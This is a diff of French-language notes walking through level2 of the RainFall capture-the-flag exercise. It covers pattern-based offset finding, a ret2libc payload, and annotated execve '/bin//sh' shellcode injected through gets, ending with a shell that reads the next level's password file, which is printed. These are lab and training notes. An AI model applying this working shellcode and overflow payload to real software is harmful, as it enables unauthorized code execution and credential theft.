@@ -91,7 +91,8 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
 
 Program received signal SIGSEGV, Segmentation fault.
-0x37634136 in ?? ()
+0x37634136 in ?? () 
+##-> register 80
 
 ## find system
 (gdb) b main
@@ -125,15 +126,70 @@ Mapped address spaces:
         0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
         0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
         0xbffdf000 0xc0000000    0x21000        0x0 [stack]
-(gdb) find 0xb7e2c000, 0xb7fcf000, '/bin/sh'
-No symbol table is loaded.  Use the "file" command.
 (gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
 0xb7f8cc58
 1 pattern found.
 (gdb) x/s 0xb7f8cc58
+
 0xb7f8cc58: "/bin/sh"
 
 ## exploiting
 
 [Padding jusqu'à l'adresse de retour] + [Adresse de system] + [Adresse de exit] + [Adresse de "/bin/sh"]
 python -c 'print("A"*80 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7")' > input.txt
+-----------------
+## On change de methode 
+
+level2@RainFall:~$ ltrace ./level2 
+__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
+fflush(0xb7fd1a20)                                                                                       = 0
+gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5
+)                                                            = 0xbffff6fc
+puts(""
+)                                                                                                 = 1
+strdup("")                                                                                               = 0x0804a008
+je vais passer par un shellcode attaque
+https://www.exploit-db.com/exploits/39160
+
+
+\x6a\x0b       ; push byte +0xb          ; Push le numéro de l'appel système execve (11) sur la pile
+\x58           ; pop eax                 ; Pop la valeur précédemment poussée (0xb) dans le registre EAX
+\x99           ; cdq                     ; Convertir DWORD en double (EAX est déjà 0x0000000b, CDQ étend le signe dans EDX)
+\x52           ; push edx                ; Push EDX (qui est 0) sur la pile (argument pour envp = NULL)
+\x68\x2f\x2f\x73\x68 ; push 0x68732f2f   ; Push la chaîne "//sh" sur la pile
+\x68\x2f\x62\x69\x6e ; push 0x6e69622f   ; Push la chaîne "/bin" sur la pile
+\x89\xe3       ; mov ebx, esp            ; Déplacer l'adresse de la chaîne "/bin//sh" dans EBX (premier argument pour execve)
+\x31\xc9       ; xor ecx, ecx            ; Mettre ECX à 0 (second argument pour execve, argv = NULL)
+\xcd\x80       ; int 0x80                ; Appel système (interruption logicielle pour exécuter l'appel système)
+
+on genere un paterne pour le buffer overflow https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+```
+level2@RainFall:~$ gdb -q ./level2 
+Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
+(gdb) r
+Starting program: /home/user/level2/level2 
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
+
+```
+
+0x37634136 pointe sur l offset 80 
+
+je genere un patterne shellcode + 80 - (len shellcode) * 'A' + addresse de retour  
+level2@RainFall:~$ python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"' > input.txt 
+level2@RainFall:~$ cat input.txt - | ./level2
+
+level2@RainFall:~$  cat input.txt - | ./level2
+j
+ X�Rh//shh/bin��1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
+whoami
+level3
+pwd
+/home/user/level2
+cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
